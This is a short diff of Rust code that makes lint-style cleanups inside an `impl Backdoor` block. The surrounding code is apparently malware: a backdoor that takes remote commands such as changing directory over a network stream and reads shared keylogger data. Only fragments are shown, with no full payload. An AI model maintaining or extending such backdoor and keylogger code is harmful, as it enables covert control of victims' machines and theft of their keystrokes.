@@ -93,7 +93,7 @@ impl Backdoor
             }
             else
             {
-                match self.change_directory(&dir)
+                match self.change_directory(dir)
                 {
                     Ok(_) => {return String::from("Directory changed to: ") + dir;},
                     Err(e) => { return e; }
@@ -161,7 +161,7 @@ impl Backdoor
 
         loop 
         {
-            let mut data = [0 as u8; MAX_INPUT_BUFFER];
+            let mut data = [0_u8; MAX_INPUT_BUFFER];
             let mut data_buffer = Vec::<u8>::new();
 
             let val = key_logger_data.lock().unwrap();
@@ -209,12 +209,9 @@ impl Backdoor
                             }
                         }
                     }
-                    else
+                    else if stream.write("Ok".as_bytes()).is_err()
                     {
-                        if let Err(_) = stream.write("Ok".as_bytes())
-                        {
-                            break;
-                        }
+                        break;
                     }
                 },
                 Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => 
